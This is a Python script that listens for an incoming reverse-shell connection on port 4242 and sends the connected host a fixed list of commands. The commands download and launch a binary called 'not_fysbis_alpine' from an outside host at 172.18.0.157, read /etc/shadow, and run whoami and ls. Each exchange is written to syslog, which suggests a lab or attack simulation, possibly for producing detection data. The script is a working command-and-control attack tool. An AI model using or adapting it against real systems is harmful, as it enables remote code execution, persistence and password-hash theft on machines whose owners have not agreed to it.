import sys
import time
import socket
import datetime

def listen(ip,port,commands):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((ip, port))
	s.listen(1)
	print("Listening on port {}".format(str(port)))
	conn, addr = s.accept()
	print("Connection received from {}".format(addr))
	
	now = datetime.datetime.now()
	syslog_timestamp = now.strftime("%b  %d %H:%M:%S")
	
	with open("/var/log/syslog","a") as sys_log_file:
			sys_log_file.write("{}: Listening on port {}\n".format(syslog_timestamp, str(port)))
			sys_log_file.write("{}: Connection received from {}\n".format(syslog_timestamp, addr))
	for command in commands:
		#Receive data from the target and get user input

		print(command)

		#Send commands
		command += "\n"
		conn.send(command.encode())
		time.sleep(1)
		
		ans = conn.recv(1024).decode()
		#sys.stdout.write(ans)

		now = datetime.datetime.now()
		syslog_timestamp = now.strftime("%b  %d %H:%M:%S")

		with open("/var/log/syslog","a") as sys_log_file:
			sys.stdout.write(ans+"\n")
			sys_log_file.write("{}: {}\n".format(syslog_timestamp,ans+"\n"))


commands = ["wget http://172.18.0.157:8000/golang_files/not_fysbis_alpine","chmod +x not_fysbis_alpine", "nohup ./not_fysbis_alpine &", "ls", "cat /etc/shadow", "whoami", "ls -al", ""]
listen("0.0.0.0",4242,commands)
